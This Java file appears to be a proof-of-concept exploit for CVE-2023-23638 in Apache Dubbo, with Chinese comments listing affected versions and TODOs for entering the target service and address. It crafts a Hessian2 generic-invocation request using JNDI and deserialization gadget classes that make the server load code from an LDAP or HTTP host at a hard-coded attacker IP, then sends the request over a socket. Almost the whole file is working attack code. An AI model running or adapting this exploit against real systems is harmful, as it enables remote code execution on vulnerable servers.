package cve;

import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import util.FileUtil;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;


/**
 * 影响版本：
 * Apache Dubbo 2.7.x <= 2.7.21
 * Apache Dubbo 3.0.x <= 3.0.13
 * Apache Dubbo 3.1.x <= 3.1.5
 */
public class CVE_2023_23638_2 {
    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);


        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);


        // set body
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2ObjectOutput hessian2ObjectOutput = new Hessian2ObjectOutput(baos);
        hessian2ObjectOutput.writeUTF("2.7.6");
        //todo 此处填写Dubbo提供的服务名
        hessian2ObjectOutput.writeUTF("com.example.api.DemoService");
        hessian2ObjectOutput.writeUTF("");
        hessian2ObjectOutput.writeUTF("$invoke");
        hessian2ObjectOutput.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        //todo 此处填写Dubbo提供的服务的方法
        hessian2ObjectOutput.writeUTF("sayHello");
        hessian2ObjectOutput.writeObject(new String[] {"java.lang.String"});

//        getRawReturnPayload2(hessian2ObjectOutput, "ldap://192.168.26.160:1389/pjppmx");
        getRawReturnPayload1(hessian2ObjectOutput, "http://127.0.0.1:8000/svg1_calc.svg");


        hessian2ObjectOutput.flushBuffer();

        Bytes.int2bytes(baos.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(baos.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    private static void getRawReturnPayload1(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.batik.swing.JSVGCanvas");
        jndi.put("URI", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getRawReturnPayload2(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);

    }

    private static void getRawReturnPayload3(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();

        jndi.put("class", "com.sun.rowset.JdbcRowSetImpl");
        jndi.put("dataSourceName", "ldap://192.168.26.160:1389/rjoxgg");
        jndi.put("autoCommit", "true");

        List<HashMap> list = new ArrayList<>();
        list.add(jndi);
        out.writeObject(new Object[]{list});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
        javaBeanDescriptor.setProperty("asText",ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap map = new HashMap();

        map.put("generic", "bean");
        out.writeObject(map);
    }

    private static void getNativeJavaPayload(Hessian2ObjectOutput out, String serPath) throws IOException {
        byte[] payload = FileUtil.getBytesByFile(serPath);
        out.writeObject(new Object[] {payload});

        HashMap map = new HashMap();
        map.put("generic", "nativejava");
        out.writeObject(map);
    }

}
